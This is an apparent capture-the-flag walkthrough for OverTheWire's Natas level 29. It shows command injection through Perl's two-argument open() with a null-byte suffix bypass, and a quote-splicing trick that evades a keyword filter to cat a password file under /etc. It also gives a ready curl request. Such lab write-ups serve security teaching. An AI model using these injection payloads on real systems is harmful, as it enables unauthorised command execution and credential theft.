> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                        |
| -------- | ------------------------------------------------------------ |
| URL      | `http://natas29.natas.labs.overthewire.org`                  |
| Username | `natas29`                                                    |
| Password | *found in [Natas Level 27 → 28](natas-level-27-level-28.md)* |

---

## Tools Used

- A web browser
- **`curl`** — to craft GET requests with injected shell commands
- **URL encoding** — to pass special characters through the query string

---

## Solution

### Step 1 — Open the URL

Navigate to `http://natas29.natas.labs.overthewire.org` and log in with the password from Level 28.

The page greets you in hacker l33tspeak and presents a dropdown menu with options like `perl underground`, `perl underground 2`, and so on. Selecting any option reloads the page and displays the contents of a corresponding text file. The URL changes to:

```
http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground
```

Two things stand out immediately:

- The script is `index.pl` → this is Perl, not PHP.
- A `file` parameter is passed directly in the URL, and the server uses it to load content.

Right-click is disabled on the page, but that is purely cosmetic, the source link is not needed here. The URL tells you everything: a filename from user input is being read server-side.

---

### Understand Perl's `open()` and Command Injection

The standard way to read a file in Perl is the two-argument form of `open()`:

```perl
open(FD, "$f.txt");
```

This opens the file at path `$f.txt`. But the two-argument form of `open()` also accepts a **command** if the string starts or ends with a pipe character (`|`):

```perl
open(FD, "|command");   # write to command's stdin
open(FD, "command|");   # read from command's stdout
```

If `$f` contains a leading `|`, Perl interprets the entire string as a shell command and pipes its output into the filehandle `FD`. The script then reads from `FD` and prints the output to the page, which means arbitrary command output lands in the HTTP response.

This is not a misuse of `open()` in the sense of a buffer overflow or memory bug. It is a deliberate feature of the two-argument form: the pipe-as-command syntax is documented. The vulnerability is that user input reaches `open()` without stripping the `|` character, so the "feature" becomes an injection point.

**Why the null byte?** The server appends `.txt` to `$f` before passing it to `open()`:

```perl
open(FD, "$f.txt");
```

If you inject `|ls`, the command becomes `|ls.txt`, which is not a valid command and produces no output. You need to terminate the string before the `.txt` suffix is appended. In URLs, `%00` is a null byte (`\0`). When Perl receives a string containing a null byte and passes it to a system call, the C runtime truncates the string at that byte, everything after `\0` is ignored. So `|ls%00` becomes the command `|ls` by the time it reaches the shell.

---

### Step 2 — Confirm Command Injection

Test with `ls` to verify execution:

```
http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00
```

The response shows the files in the web directory — `index.pl`, several `.txt` files. Command injection is confirmed.

Test `pwd` to confirm the working directory:

```
http://natas29.natas.labs.overthewire.org/index.pl?file=|pwd%00
```

Output: `/var/www/natas/natas29`. This is the server-side path.

---

### Step 3 — Attempt to Read the Password File

Following the pattern from previous levels, the password is at `/etc/natas_webpass/natas30`. Try reading it directly:

```
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat /etc/natas_webpass/natas30%00
```

The response is:

```
meeeeeep!
```

The server blocked the request. Something in the input triggered a filter.

---

### Step 4 — Retrieve the Source Code

To understand what is being filtered, read the script itself. You already have arbitrary command execution from Step 2 — use the same injection channel:

```
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat index.pl%00
```

The injection works, but the output is mangled. The script passes every line through `CGI::escapeHTML()` before printing it.

The fix is to encode the output **before** `CGI::escapeHTML()` can touch it. Pipe through `base64` in the shell command so the output reaching the script is already pure ASCII alphanumerics with no characters the HTML encoder cares about:

```
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat index.pl | base64%00
```

The null byte terminates after `base64`, dropping the `.txt` suffix. The shell executes `cat index.pl | base64`, and the script prints the resulting base64 blob — which `CGI::escapeHTML()` passes through unchanged, because base64 contains no HTML-special characters.

The response is a block of base64. Decode it locally:

```bash
echo "<base64 blob>" | base64 -d
```

The relevant section of `index.pl`:

```perl
if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    } else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}
```

Walking through it:

```perl
if($f=~/natas/){
    print "meeeeeep!<br>";
}
```

`=~` is Perl's regex match operator. `/natas/` is the pattern. If the string `"natas"` appears **anywhere** in `$f`, the condition is true and execution stops. The filter is a simple substring match, no anchoring, no case sensitivity flags, so it fires for `natas`, `Natas`, `natas30`, `/etc/natas_webpass/natas30`, and anything else containing that five-character sequence.

```perl
open(FD, "$f.txt");
```

Two-argument `open()`, as established above. The `.txt` suffix is appended unconditionally. The null byte in the URL bypasses it.

There is no filter on `|`, no filter on `/`, no filter on any shell metacharacters other than the indirect consequence of blocking `natas`. The injection channel is fully open; only the literal string `"natas"` in the path is blocked.

---

### Understand the Filter Bypass

The filter is a regex match on the raw string. It matches the literal sequence `n`, `a`, `t`, `a`, `s`. Any transformation that breaks up that sequence while still producing a valid shell path will bypass it.

The shell treats a quoted empty string (`''` or `""`) as a zero-length string and splices it silently into the surrounding word during variable expansion. These are valid in bash:

```bash
cat /etc/na''tas_webpass/na''tas30      # single-quote empty string
cat /etc/na""tas_webpass/na""tas30      # double-quote empty string
```

Both commands are identical to `cat /etc/natas_webpass/natas30` at execution time. The shell strips the empty quotes before passing the path to `open()` at the syscall level. The Perl filter never sees the string `"natas"` — it sees `"na''tas_webpass/na''tas30"`, which does not match `/natas/`.

Alternatively, shell glob wildcards `?` and `*` also work. `?` matches any single character:

```bash
cat /etc/na?as_webpass/na?as30
```

The shell expands `na?as` to `natas` during pathname expansion. Again, the Perl filter sees `na?as`, not `natas`.

Either technique works. The empty-string quote splice is slightly more precise; the wildcard is shorter to type.

---

### Step 5 — Read the Password

Using empty-string quote splicing to break the word `natas` in the path:

```
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat /etc/na''tas_webpass/na''tas30%00
```

URL-encoded for `curl`:

```bash
curl -u natas29:<password> \
     "http://natas29.natas.labs.overthewire.org/index.pl?file=%7Ccat%20%2Fetc%2Fna''tas_webpass%2Fna''tas30%00"
```

The server executes `cat /etc/natas_webpass/natas30`, the filter never matches, and the password is printed inside a `<pre>` block in the response.

That is the password for [Natas Level 29 → 30](natas-level-29-level-30.md).

---

## Key Takeaways

- **Perl's two-argument `open()` is an injection sink.** If the string starts with `|`, Perl treats it as a shell command. Any code that passes unsanitised user input to the two-argument form of `open()` has a command injection vulnerability. The three-argument form (`open(FD, "<", $f)`) is explicit about direction and does not interpret metacharacters — it is the correct alternative.
- **The null byte truncates the appended suffix.** Appending `.txt` server-side looks like a constraint on what files can be opened, but a null byte in the URL terminates the string before that suffix is seen by the OS. This is a classic null-byte injection pattern and applies anywhere a C-backed runtime processes user-controlled strings with appended extensions.
- **This is the first Perl level.** Perl's `open()` injection, the `=~` regex match operator, and the shell's empty-string quote splice are all Perl/Unix-specific idioms that do not appear in the PHP levels. Recognising what language the backend is written in, here, the `.pl` extension and the `use CGI` import — determines which injection primitives apply.

---